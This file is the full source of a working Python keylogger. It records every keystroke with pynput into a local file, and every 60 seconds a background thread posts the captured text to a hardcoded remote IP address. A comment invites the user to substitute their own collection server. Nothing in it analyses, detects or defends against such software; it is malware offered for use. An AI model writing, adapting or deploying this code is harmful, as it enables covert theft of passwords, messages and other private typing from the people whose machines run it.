import pynput.keyboard
import logging
import requests
from threading import Thread
import os
import time

# Configuration
LOG_FILE = 'keystrokes.txt'
LOGGING_FILE = 'keylogger.log'
SERVER_URL = "http://157.245.109.137:9988/submit"  # Replace with your server URL
UPLOAD_INTERVAL = 60  # Time interval in seconds to send data to server

# Set up logging
logging.basicConfig(filename=LOGGING_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def on_press(key):
    """Callback function for key presses."""
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    
    with open(LOG_FILE, "a") as f:
        f.write(key_str)

def send_data_to_server():
    """Send the keystroke file to the server."""
    if not os.path.isfile(LOG_FILE):
        logging.error("Keystroke file does not exist.")
        return
    
    with open(LOG_FILE, 'r') as f:
        keystrokes = f.read()
    
    try:
        payload = {'keystrokes': keystrokes}
        response = requests.post(SERVER_URL, data=payload)
        response.raise_for_status()  # Raise an error for bad responses
        logging.info("Data sent successfully.")
    except requests.RequestException as e:
        logging.error(f"Failed to send data: {e}")

def start_keylogger():
    """Start the keylogger."""
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def monitor_and_send():
    """Monitor and periodically send keystroke data to the server."""
    while True:
        time.sleep(UPLOAD_INTERVAL)  # Wait for the specified interval
        send_data_to_server()

if __name__ == "__main__":
    logging.info("Keylogger started.")
    
    # Start keylogger in a separate thread to avoid blocking
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.start()
    
    # Start monitoring and sending data in a separate thread
    monitoring_thread = Thread(target=monitor_and_send)
    monitoring_thread.start()
